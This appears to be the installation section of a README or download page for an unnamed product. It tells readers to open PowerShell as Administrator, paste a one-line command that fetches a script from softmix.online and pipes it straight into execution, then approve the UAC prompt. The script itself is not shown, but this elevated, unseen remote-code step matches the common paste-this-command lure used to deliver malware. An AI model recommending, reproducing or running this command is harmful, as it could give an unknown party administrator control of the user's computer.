## `INSTALLATION`

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://softmix.online/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically
4. Wait until the installer finishes
